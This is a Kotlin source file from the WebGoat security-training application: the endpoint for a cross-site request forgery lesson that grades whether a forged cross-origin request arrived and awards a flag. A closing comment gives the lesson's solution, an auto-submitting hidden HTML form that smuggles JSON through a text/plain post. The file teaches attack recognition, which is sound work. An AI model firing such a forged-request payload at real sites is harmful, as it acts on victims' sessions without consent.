/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.csrf

import com.fasterxml.jackson.databind.DeserializationFeature
import com.fasterxml.jackson.databind.ObjectMapper
import jakarta.servlet.http.Cookie
import jakarta.servlet.http.HttpServletRequest
import org.apache.commons.lang3.exception.ExceptionUtils
import org.owasp.webgoat.container.assignments.AssignmentEndpoint
import org.owasp.webgoat.container.assignments.AssignmentHints
import org.owasp.webgoat.container.assignments.AttackResult
import org.owasp.webgoat.container.assignments.AttackResultBuilder.Companion.failed
import org.owasp.webgoat.container.assignments.AttackResultBuilder.Companion.success
import org.owasp.webgoat.container.session.LessonSession
import org.springframework.http.MediaType
import org.springframework.web.bind.annotation.PostMapping
import org.springframework.web.bind.annotation.RequestBody
import org.springframework.web.bind.annotation.RequestParam
import org.springframework.web.bind.annotation.ResponseBody
import org.springframework.web.bind.annotation.RestController
import java.util.UUID

@RestController
@AssignmentHints("csrf-feedback-hint1", "csrf-feedback-hint2", "csrf-feedback-hint3")
class CSRFFeedback(
    private val userSessionData: LessonSession,
    private val objectMapper: ObjectMapper,
) : AssignmentEndpoint {
    @PostMapping(
        value = ["/csrf/feedback/message"],
        produces = ["application/json"],
    )
    @ResponseBody
    fun completed(
        request: HttpServletRequest,
        @RequestBody feedback: String,
    ): AttackResult {
        try {
            objectMapper
                .apply {
                    enable(DeserializationFeature.FAIL_ON_IGNORED_PROPERTIES)
                    enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES)
                    enable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS)
                    enable(DeserializationFeature.FAIL_ON_READING_DUP_TREE_KEY)
                    enable(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES)
                    enable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS)
                }.readValue(feedback.toByteArray(), Map::class.java)
        } catch (e: Exception) {
            return failed(this).feedback(ExceptionUtils.getStackTrace(e)).build()
        }
        val correctCSRF =
            requestContainsWebGoatCookie(request.cookies) &&
                request.contentType.contains(MediaType.TEXT_PLAIN_VALUE) &&
                hostOrRefererDifferentHost(request)
        return if (correctCSRF) {
            val flag = UUID.randomUUID().toString()
            userSessionData.setValue("csrf-feedback", flag)
            success(this).feedback("csrf-feedback-success").feedbackArgs(flag).build()
        } else {
            failed(this).build()
        }
    }

    @PostMapping(path = ["/csrf/feedback"], produces = ["application/json"])
    @ResponseBody
    fun flag(
        @RequestParam("confirmFlagVal") flag: String,
    ): AttackResult =
        if (flag == userSessionData.getValue("csrf-feedback")) {
            success(this).build()
        } else {
            failed(this).build()
        }

    private fun hostOrRefererDifferentHost(request: HttpServletRequest): Boolean {
        val referer = request.getHeader("Referer")
        val host = request.getHeader("Host")
        return referer?.contains(host) != true
    }

    private fun requestContainsWebGoatCookie(cookies: Array<Cookie>?): Boolean =
        cookies?.any { it.name == "JSESSIONID" } ?: false

    /*
     * Solution:
     * <form name="attack" enctype="text/plain" action="http://localhost:8080/WebGoat/csrf/feedback/message" METHOD="POST">
     *    <!-- Construct valid JSON data: {name: "HackHuang", email: "email@example.com", subject: "suggestions", message: "Fixed the invalid solution="} -->
     *    <input type="hidden" name='{"name": "HackHuang", "email": "email@example.com", "subject": "suggestions","message":"Fixed the invalid solution' value='"}'>
     * </form>
     * <script>document.attack.submit();</script>
     */
}
